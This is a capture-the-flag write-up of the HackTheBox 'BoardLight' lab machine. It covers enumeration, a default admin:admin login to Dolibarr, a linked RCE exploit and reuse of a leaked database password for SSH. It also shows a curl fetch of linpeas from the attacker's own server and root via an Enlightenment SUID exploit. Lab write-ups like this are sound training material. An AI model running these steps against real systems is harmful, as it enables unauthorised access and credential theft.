# Enumeration

Starting with Nmap:
`nmap -sV -sC -Pn 10.10.11.11`

``` 
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 06:2d:3b:85:10:59:ff:73:66:27:7f:0e:ae:03:ea:f4 (RSA)
|   256 59:03:dc:52:87:3a:35:99:34:44:74:33:78:31:35:fb (ECDSA)
|_  256 ab:13:38:e4:3e:e0:24:b4:69:38:a9:63:82:38:dd:f4 (ED25519)
80/tcp open  http    Apache httpd 2.4.41
```

Adding to etc/hosts:
`echo '10.10.11.11 board.htb' | sudo tee -a /etc/hosts`

Lots of broken buttons on this page. There's a contact us page with a form. Seems a good place to start.

All of the buttons are Get requests even the one on the contact form. And it doesn't seem to be submitting my information. The source on the page supports this...

Gonna fuzz for other pages maybe.

`ffuf -w /Users/noneya/Useful/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt:FUZZ -u http://board.htb/FUZZ -e .php -ic`

There are images and js directories but I don't have access to them.

Maybe I need to fuzz for some subdomains or vhosts.

Sub-Domain:
`ffuf -w /Users/noneya/Useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://FUZZ.board.htb -v`

Nope.

VHosts:
`ffuf -w /Users/noneya/Useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://board.htb -H 'Host: FUZZ.board.htb' `

A vhost called crm seems to exist.

Adding to etc/hosts.

It has a login page... 

The password reset page just asks for a security code and the login...

I see [this page](https://www.swascan.com/security-advisory-dolibarr-17-0-0/) seems to indicate I can get remote code execution if I can get authenticated.

Gonna fuzz for other directories or pages on crm.board.htb.

There are a lot of other directories and most I don't have access to.

I just tried admin:admin and it let me in...

There is an exploit script on [this GitHub repo](https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253/blob/main/exploit.py) gonna try that to see if I can get it. Trying to create a page manually on my end seems to have failed. Not sure if its the user or not.

The script worked. So I must have missed something the other way.

# Foothold

Now that I have a foothold I can get the user flag.

`find -name '*user.txt' 2>/dev/null`

hmm that didnt work

For pretty shell:
```
script /dev/null -qc /bin/bash
stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```

`sudo -l` is a miss too.

How many user are on the box ? (`cat /etc/passwd | grep /bin/bash`)

I can't help but notice it says www-data@boardlight as my user. Does that mean I am still in www-data, which is why I can't see the user flag?

Looks like I have access to Python3... Which might be helpful later.

In /etc/security there is a fill call access.conf, but it doesn't contain anything but comments.

There is a Home dir, with a user called larissa, but I don't have access. Seems I need to get her password and ssh in probably.

Lets look for some .dat files maybe:
`find / -name '*.dat' 2>/dev/null`

Theres a passwords.dat file but I don't have access.

I can try this to see if I can grep for it.
`find / -name '*.dat' 2>/dev/null | xargs grep -i 'Password'`

Lets looks for passwords:
`grep -ri "password" / 2>/dev/null`

Okay so I ended needing some help here so I went to the discussion for this box.

The comments mentioned finding a config file but no matter how I grepped I couldn't find anything. So I looked up config files for Dolibar and found I need to find this file conf.php.

Once I did here `/html/crm.board.htb/htdocs/conf`.

I cat the file and see `$dolibarr_main_db_pass='serverfun2$2023!!';`

Then I tried to ssh into the server with `ssh larissa@crm.board.htb` and that password and it worked.

That allowed me to get the user file.

Now for Priv Esc.

# Priv Esc

I have access to curl so I get the linpeas.sh file. 

Start a python server inside my linpeas directory:
```
cd /Users/noneya/Useful/Tools/linpeas
python3 -m http.server 8001
```

Then I get the file

```
cd /tmp
curl http://10.10.14.69:8001/linpeas.sh > /tmp/linpeas.sh
```

Then get the output:
`bash linpeas.sh > /home/larissa/results.txt`

There an interesting host in the output...
```
127.0.1.1	boardlight
```

When looking at the linpeas output and specifically grepping for light I see:
```
  LightCyan: Users with console
  LightMagenta: Your username
Hostname: boardlight
lightdm Not Found
boardlight
127.0.0.1	localhost boardlight board.htb crm.board.htb
127.0.1.1	boardlight
-rwsr-xr-x 1 root root 27K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys (Unknown SUID binary!)
-rwsr-xr-x 1 root root 15K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_ckpasswd (Unknown SUID binary!)
-rwsr-xr-x 1 root root 15K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_backlight (Unknown SUID binary!)
-rwsr-xr-x 1 root root 15K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/modules/cpufreq/linux-gnu-x86_64-0.23.1/freqset (Unknown SUID binary!
```

The enlightenment_sys file seems interesting so I searched for exploits and found:
https://www.exploit-db.com/exploits/51180

This is a priv esc exploit with a script already written for it. All I did was copy it over (same way as linpeas), then run and had a root shell.

Then getting the root flag was easy.

